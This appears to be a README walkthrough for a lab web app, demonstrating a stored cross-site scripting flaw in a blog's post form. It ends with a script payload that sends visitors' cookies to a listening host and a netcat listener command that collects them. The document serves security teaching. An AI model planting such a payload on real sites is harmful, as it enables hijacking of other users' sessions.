Run the website and see the working of the website.

When we enter the website it shows login page click on register link to register your account.

<img width="628" alt="image" src="https://github.com/user-attachments/assets/52baaa69-6c6f-4a27-accd-2fe483b9e0c9" />

After registering your account it will redirect you to the login page. Login to use the applications.

<img width="632" alt="image" src="https://github.com/user-attachments/assets/b0f07ad8-70a4-458a-aa2c-8dc4cad109d1" />

After login you'll see two options add a new post and useraccount.

<img width="638" alt="image" src="https://github.com/user-attachments/assets/35486c09-fc8c-42b0-aa1c-a1b517000706" />

 When we visit the useraccount it will show the dashboard of the user.

 After this click on add a new post.

 Enter the title, content and author and click on submit.

 <img width="629" alt="image" src="https://github.com/user-attachments/assets/aa2b831d-9dc6-4812-9f1b-b498e24c9f5d" />

After clicking on submit it will be shown in the index page.

<img width="627" alt="image" src="https://github.com/user-attachments/assets/72eddb00-c342-4f19-bfa2-79cfce4085ff" />

Now click if the title, content or author can pass the html or not.

<img width="626" alt="image" src="https://github.com/user-attachments/assets/7394fc61-6d25-4ff5-9aad-4c0a5409d170" />

When we click on submit the page will be redirected to the index page observe the post you submitted the content passes the html to the database and is shown in the index page.

<img width="634" alt="image" src="https://github.com/user-attachments/assets/83dca75f-5953-45e2-8f95-9ba32610ebf8" />

Now check if it allows us to inject a script or not.

<img width="629" alt="image" src="https://github.com/user-attachments/assets/0fa81138-4400-45dd-b4c5-82c1931a0c67" />

It successfully injected the script into the html. It means this website has stored xss vulnerability.

<img width="624" alt="image" src="https://github.com/user-attachments/assets/ddb3e1ff-aaf1-44fc-824e-630938db67d5" />

Now to steal the admin cookie inject the following script to the content field of the form

```
<script>document.location="http:127.0.0.1:8080"+document.cookie;</script>
```

This allows the attacker to steal the cookies of the users whoever visits the website after injecting the above script in the content field.

To get the cookies of the users who visits the website we use the command.

```
nc -lnvp 8080
```

<img width="853" alt="image" src="https://github.com/user-attachments/assets/e2bb3c2e-8217-428c-b513-627d47791ceb" />

In this way the attacker can steal the cookies of the users of an application using xss vulnerability.

